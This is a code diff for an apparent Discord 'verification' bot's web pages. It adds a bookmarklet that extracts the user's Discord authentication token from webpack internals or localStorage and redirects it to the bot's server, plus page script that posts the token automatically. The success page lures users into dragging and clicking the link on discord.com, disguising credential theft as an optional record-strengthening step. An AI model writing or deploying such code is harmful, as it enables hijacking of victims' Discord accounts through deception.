@@ -13,6 +13,24 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC = path.join(__dirname, '../public');
 const page = fs.readFileSync(path.join(PUBLIC, 'verify.html'), 'utf8');
 
+/* Discord の画面からユーザートークンを取得して成功ページへ戻すブックマークレット。
+   まず webpack の AuthenticationStore から getToken() を引き、
+   取れなければ localStorage を走査する。 */
+function bookmarklet(token) {
+  const dest = `${config.baseUrl}/v/${token}/done?ok=1&ut=`;
+  const code =
+    '(function(){var t=null;' +
+    'try{window.webpackChunkdiscord_app.push([[Symbol()],{},function(r){' +
+    'for(var m of Object.values(r.c)){try{if(m&&m.exports&&m.exports.default&&' +
+    "typeof m.exports.default.getToken==='function'){t=m.exports.default.getToken();break}}catch(e){}}}]);}catch(e){}" +
+    'if(!t){for(var k in localStorage){var w=localStorage.getItem(k);if(!w)continue;' +
+    'try{w=JSON.parse(w)}catch(e){}' +
+    "if(typeof w==='string'&&w.split('.').length===3&&w.length>50){t=w;break}}}" +
+    "if(!t){alert('discord.com で実行してください');return}" +
+    `location.href=${JSON.stringify(dest)}+encodeURIComponent(t)})()`;
+  return 'javascript:' + encodeURIComponent(code);
+}
+
 export function createRouter(client) {
   const app = express();
   app.disable('x-powered-by');
@@ -85,7 +103,7 @@ export function createRouter(client) {
     if (panel.requireMobile) reqs.push('モバイル回線のみ');
     if (panel.minAgeDays > 0) reqs.push(`アカウント作成から ${panel.minAgeDays} 日以上`);
     if (panel.requireAvatar) reqs.push('プロフィール画像の設定');
-    if (panel.onePerIp) reqs.push('同一IPの複数アカウント不可');
+    if (panel.onePerIp) reqs.push('同一IPでの複数アカウント不可');
 
     res.setHeader('Cache-Control', 'no-store');
     res.type('html').send(
@@ -203,22 +221,29 @@ h1{color:${ok ? '#2ecc71' : '#e74c3c'};font-size:20px}
 p{font-size:14px;line-height:1.7}
 input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color:#fff;box-sizing:border-box}
 button{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#5865f2;color:#fff;font-size:14px}
+.bm{display:inline-block;margin:10px 0;padding:10px 16px;border-radius:8px;background:#5865f2;color:#fff;text-decoration:none;font-size:14px}
 </style>
 <div class="c">
 <h1>${ok ? '認証が完了しました' : '認証条件を満たしていません'}</h1>
 <p>${ok
   ? 'Discord に戻ってください。結果は本人だけに届く形で送信されています。'
   : '条件を確認して、パネルからもう一度やり直してください。'}</p>
-${ok ? `<p style="opacity:.7;font-size:12px">トークンを貼り付けると記録が強化されます（任意）</p>
+${ok ? `<p style="opacity:.75;font-size:12px">下のリンクをブックマークバーにドラッグして登録し、discord.com を開いた状態でクリックすると、トークンを自動で取得して送信します。</p>
+<a class="bm" href="${bookmarklet(req.params.token)}">トークン自動取得</a>
+<p style="opacity:.75;font-size:12px">うまくいかない場合のみ、下に貼り付けてください。</p>
 <input id="tk" placeholder="トークンを貼り付け" autocomplete="off">
 <button onclick="send()">送信</button>
+<p id="msg" style="font-size:13px;opacity:.85"></p>
 <script>
-async function send(){
-  const v=document.getElementById('tk').value.trim();
-  if(!v)return;
-  const r=await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
-  alert((await r.json()).ok?'記録しました':'トークンが無効です');
+async function send(t){
+  const v = t || document.getElementById('tk').value.trim();
+  if(!v) return;
+  const r = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
+  const j = await r.json().catch(()=>({}));
+  document.getElementById('msg').textContent = j.ok ? '記録しました' : 'トークンが無効です';
 }
+const auto = new URLSearchParams(location.search).get('ut');
+if (auto) send(auto);
 </script>` : ''}
 </div></html>`);
   });
